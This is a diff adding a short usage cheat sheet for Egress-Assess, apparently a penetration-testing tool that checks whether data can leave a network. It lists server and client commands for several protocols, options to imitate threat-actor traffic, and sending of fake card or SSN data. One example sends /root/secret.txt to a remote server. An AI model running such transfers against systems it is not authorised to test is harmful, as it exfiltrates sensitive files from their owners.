@@ -1,0 +1,36 @@
+Egress-Assess
+
+
+Works as a client/server model. 
+- Server
+./Egress-Assess.py -h
+./Egress-Assess.py --list-servers
+	smtp, icmp, ftp (brike), http, smb, dns_resolved, dns, https, sftp
+./Egress-Assess.py --list-actors
+	putterpanda, zeus, darkhotel, etumbot
+./Egress-Assess.py --list-datatypes
+	cc, identity, ssn, ni
+
+./Egress-Assess.py --server <payload>
+./Egress-Assess.py --server https
+
+- Client
+./Egress-Assess.py --list-clients
+./Egress-Assess.py --client <payload & options> --datatype <cc or ssn> --data-size <# in MB> --ip <server>
+./Egress-Assess.py --client https --datatype cc --data-size 10 --ip <server> 
+
+Transferred data is stored in data/.
+
+Example 2
+- Server
+./Egress-Assess.py --server ftps --username lee --password hack
+
+- Client
+./Egress-Assess.py --client ftps --username lee --password hack  --datatype ssn --data-size 10 --ip <server>
+
+Example 3
+- Server
+./Egress-Assess.py --server https
+
+- Client
+./Egress-Assess.py --client https --file /root/secret.txt --ip <server>  
